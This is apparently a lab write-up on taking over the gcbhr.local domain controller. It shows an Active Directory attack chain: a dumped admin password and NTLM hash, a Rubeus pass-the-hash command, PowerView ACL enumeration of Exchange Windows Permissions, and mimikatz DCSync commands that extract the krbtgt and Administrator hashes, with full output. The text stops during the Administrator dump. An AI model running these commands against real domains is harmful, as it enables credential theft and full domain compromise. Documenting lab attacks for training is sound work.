---
layout: default
---

## hr-dc02 192.168.43.1

In order to access to gcbhr.local domain controller, It's required enumerate the HR domain and look for attck path, and reuse the erika-admin credentials extractd on the previous lab:

```
Authentication Id : 0 ; 241279 (00000000:0003ae7f)
Session           : Service from 0
User Name         : erika-admin
Domain            : HR
Logon Server      : HR-DC02
Logon Time        : 4/28/2024 11:46:21 PM
SID               : S-1-5-21-3602425948-896546556-3985009324-1105
        msv :
         [00000003] Primary
         * Username : erika-admin
         * Domain   : HR
         * NTLM     : d5629de7fd9d15efcffecfdd4f1156ae
         * SHA1     : 61efbc84c24a8b223224a74d0133ced5aaaca649
         * DPAPI    : f079c68089049c0bde676886f4021fd3
        tspkg :
        wdigest :
         * Username : erika-admin
         * Domain   : HR
         * Password : (null)
        kerberos :
         * Username : erika-admin
         * Domain   : GCBHR.LOCAL
         * Password : N0tForD@ilyUse
        ssp :
        credman :
```

### 1. Impersonate erika-admin user on gcbhr.local domain

```
PS C:\> .\Rubeus.exe asktgt /domain:gcbhr.local /user:erika-admin /ntlm:d5629de7fd9d15efcffecfdd4f1156ae /ptt
.\Rubeus.exe asktgt /domain:gcbhr.local /user:erika-admin /ntlm:d5629de7fd9d15efcffecfdd4f1156ae /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.1

[*] Action: Ask TGT

[*] Using rc4_hmac hash: d5629de7fd9d15efcffecfdd4f1156ae
[*] Building AS-REQ (w/ preauth) for: 'gcbhr.local\erika-admin'
[*] Using domain controller: 192.168.43.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/gcbhr.local
  ServiceRealm             :  GCBHR.LOCAL
  UserName                 :  erika-admin
  UserRealm                :  GCBHR.LOCAL
  StartTime                :  7/25/2024 2:03:54 AM
  EndTime                  :  7/25/2024 12:03:54 PM
  RenewTill                :  8/1/2024 2:03:54 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  M+ToRWI9XJaQt3dmx7V9IQ==
  ASREP (key)              :  D5629DE7FD9D15EFCFFECFDD4F1156AE
```

### 2. Enumerate Domain Groups And Domain ACls

Erika-admin Exchange Windows Permissions group:
```
name              : Exchange Windows Permissions
distinguishedname : CN=Exchange Windows Permissions,OU=Microsoft Exchange Security Groups,DC=gcbhr,DC=local
memberof          :
member            : {CN=Exchange Trusted Subsystem,OU=Microsoft Exchange Security Groups,DC=gcbhr,DC=local,
                    CN=erika-admin,CN=Users,DC=gcbhr,DC=local}
```
Domain ACLs:
```
PS C:\Windows\system32> Get-DomainObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -like '*Exchange Windows Permissions*' -and $_.ObjectDN -like 'CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local'}
Get-DomainObjectAcl -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -like '*Exchange Windows Permissions*' -and $_.ObjectDN -like 'CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local'}



AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Change-Password
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 256
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 72
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent, InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 256
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : CreateChild
ObjectAceType          : inetOrgPerson
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 1
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : CreateChild
ObjectAceType          : Computer
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 1
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : CreateChild
ObjectAceType          : Group
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 1
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : CreateChild
ObjectAceType          : Organizational-Unit
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 1
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : CreateChild
ObjectAceType          : User
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 1
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : CreateChild
ObjectAceType          : Contact
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 1
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : Pwd-Last-Set
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : Managed-By
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : User-Account-Control
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : Country-Code
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : WWW-Home-Page
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : Self-Membership
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : WriteProperty
ObjectAceType          : SAM-Account-Name
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 32
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : All
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : DeleteTree, WriteDacl
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 262208
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : DeleteTree, WriteDacl
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 262208
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : inetOrgPerson
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Computer
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Group
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Organizational-Unit
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Organizational-Unit
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : User
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

AceQualifier           : AccessAllowed
ObjectDN               : CN=HR-DC02,OU=Domain Controllers,DC=gcbhr,DC=local
ActiveDirectoryRights  : Delete
ObjectAceType          : All
ObjectSID              : S-1-5-21-3602425948-896546556-3985009324-1000
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : InheritOnly
SecurityIdentifier     : S-1-5-21-3602425948-896546556-3985009324-1125
AccessMask             : 65536
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, InheritOnly, Inherited
InheritedObjectAceType : Contact
OpaqueLength           : 0
IdentityName           : HR\Exchange Windows Permissions

```




### 3. Perform a DCsync attack

Erika-admin belong to Windows exchange permissions, and could perform a DCsync attack within the gcbhr.local domain:

```
PS C:\> C:\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\krbtgt" "exit"
C:\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\krbtgt" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /user:HR\krbtgt
[DC] 'gcbhr.local' will be the domain
[DC] 'hr-dc02.gcbhr.local' will be the DC server
[DC] 'HR\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 5/26/2019 4:08:56 AM
Object Security ID   : S-1-5-21-3602425948-896546556-3985009324-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 1471b328a96edf768c0beb1b2395b031
    ntlm- 0: 1471b328a96edf768c0beb1b2395b031
    lm  - 0: 502fd452377e181458936aa636350eb0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f6458da975355c41c750aa100e1953b0

* Primary:Kerberos-Newer-Keys *
    Default Salt : GCBHR.LOCALkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 0fe692b8c987fcf7acc8b6a424764a1184c6499f29dca91036cd916406809671
      aes128_hmac       (4096) : 659718cad701c2893553f7a3bde337b2
      des_cbc_md5       (4096) : da3d1fcd797fe383

* Primary:Kerberos *
    Default Salt : GCBHR.LOCALkrbtgt
    Credentials
      des_cbc_md5       : da3d1fcd797fe383

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  d796d7c30fa1a388bd134ced613d72de
    02  bf4422fb365010af3cababfcc3b32e41
    03  aaaa643b9a4e6554a4f6536ab9d72163
    04  d796d7c30fa1a388bd134ced613d72de
    05  bf4422fb365010af3cababfcc3b32e41
    06  9b74a62a14f063fad6449a3fdfb11181
    07  d796d7c30fa1a388bd134ced613d72de
    08  f083f5e39a74a8fe0e9f859d2af5d06c
    09  f083f5e39a74a8fe0e9f859d2af5d06c
    10  56443c9ead9fd034b0cfab9497c0a392
    11  b0a1fe76cea38ceb0ac6be395f8f5194
    12  f083f5e39a74a8fe0e9f859d2af5d06c
    13  576d27d17e6f7fdcaee2d1a8c3170427
    14  b0a1fe76cea38ceb0ac6be395f8f5194
    15  5f44d71cbc6f73ccab89080420f0975f
    16  5f44d71cbc6f73ccab89080420f0975f
    17  4568cd7447f364b69914847c233b1c7d
    18  a990717c20f04747b1d4961695967cd7
    19  0ca97cff782efcd28b9d1e77020009aa
    20  b85f13ab8133c85d39c56c209f8fd34b
    21  972ba2fe09a919fb34cfaf35cd554b15
    22  972ba2fe09a919fb34cfaf35cd554b15
    23  c0022bfd37b72fa5ffedee3d1de40d4d
    24  0150e259503f71b19548f2acb4b24fa9
    25  0150e259503f71b19548f2acb4b24fa9
    26  1762fcafea63c4e8015e0ad58bec8047
    27  1b6087475df113986ad2d7a96e9d5098
    28  c3191249bcbe36708e82e439bae9f269
    29  93d8bdf3688cef6a6582d7fa26fbced7


mimikatz(commandline) # exit
Bye!
```
Domain Administrator account:
```
PS C:\> C:\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\Administrator" "exit"
C:\mimikatz.exe "privilege::debug" "lsadump::dcsync /user:HR\Administrator" "exit"

  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::dcsync /user:HR\Administrator
[DC] 'gcbhr.local' will be the domain
[DC] 'hr-dc02.gcbhr.local' will be the DC server
[DC] 'HR\Administrator' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 5/28/2019 3:58:59 AM
Object Security ID   : S-1-5-21-3602425948-896546556-3985009324-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 8ac67fcb8e19ab697a6f74f7d83436c4
    ntlm- 0: 8ac67fcb8e19ab697a6f74f7d83436c4
    ntlm- 1: c87a64622a487061ab81e51cc711a34b
